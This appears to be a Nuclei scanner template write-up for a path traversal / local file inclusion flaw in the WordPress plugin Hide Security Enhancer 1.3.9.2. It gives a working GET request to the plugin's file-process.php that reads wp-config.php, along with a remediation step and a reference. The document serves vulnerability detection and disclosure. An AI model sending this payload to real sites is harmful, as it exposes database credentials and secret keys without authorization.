# Nuclei Template: WordPress Hide Security Enhancer 1.3.9.2 Local File Inclusion
**Template ID:** hide-security-enhancer-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`hide-security-enhancer-lfi.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Hide Security Enhancer version 1.3.9.2 or less is susceptible to a local file inclusion vulnerability which could allow malicious visitors to download any file in the installation.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/wp-hide-security-enhancer/router/file-process.php?action=style-clean&file_path=/wp-config.php
```

## Remediation
Upgrade to version 1.4 or later.

## References
- https://secupress.me/blog/arbitrary-file-download-vulnerability-in-wp-hide-security-enhancer-1-3-9-2/
